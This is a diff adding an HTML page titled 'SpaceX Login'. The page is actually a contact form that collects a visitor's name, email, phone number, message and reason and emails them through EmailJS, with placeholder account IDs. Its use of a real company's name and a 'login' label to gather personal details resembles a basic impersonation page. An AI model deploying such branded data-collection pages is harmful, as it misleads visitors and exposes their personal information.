@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="favicon.ico" class="icon" />
+  <title>SpaceX Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f2f5;
+    }
+
+    .container {
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+      width: 300px;
+      text-align: center;
+    }
+
+    input[type="text"],
+    input[type="password"],
+    input[type="email"],
+    input[type="tel"],
+    textarea,
+    input[type="submit"] {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+
+    input[type="submit"] {
+      background-color: #1877f2;
+      color: white;
+      cursor: pointer;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #0e5a8a;
+    }
+
+    .message {
+      margin-top: 10px;
+      color: green;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>SpaceX Login</h2>
+    <form id="loginForm">
+      <input type="text" id="name" name="name" placeholder="Your Name" required><br>
+      <input type="email" id="senderEmail" name="senderEmail" placeholder="Your Email" required><br>
+      <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Your Phone Number" required><br>
+      <textarea id="messageContent" name="messageContent" placeholder="Message" required></textarea><br>
+      <input type="text" id="reason" name="reason" placeholder="Reason" required><br>
+      <input type="submit" value="Send Email">
+    </form>
+    <div class="message" id="message"></div> <!-- Message bar -->
+  </div>
+
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    emailjs.init("user_YOUR_USER_ID"); // Initialize EmailJS with your user ID
+
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent the default form submission
+
+      // Get the form data
+      var name = document.getElementById('name').value;
+      var senderEmail = document.getElementById('senderEmail').value;
+      var phoneNumber = document.getElementById('phoneNumber').value;
+      var messageContent = document.getElementById('messageContent').value;
+      var reason = document.getElementById('reason').value;
+
+      // Send an email with the form data
+      emailjs.send("gmail", "YOUR_TEMPLATE_ID", {
+        name: name,
+        senderEmail: senderEmail,
+        phoneNumber: phoneNumber,
+        messageContent: messageContent,
+        reason: reason
+      }).then(function(response) {
+        console.log('Email sent successfully:', response);
+        document.getElementById('message').innerText = "Email sent successfully!";
+        document.querySelector('h2').innerText = "SpaceX Login - Email Sent Successfully"; // Update heading
+      }, function(error) {
+        console.error('Error sending email:', error);
+        document.getElementById('message').innerText = "Error sending email. Please try again later.";
+      });
+    });
+  </script>
+</body>
+</html>
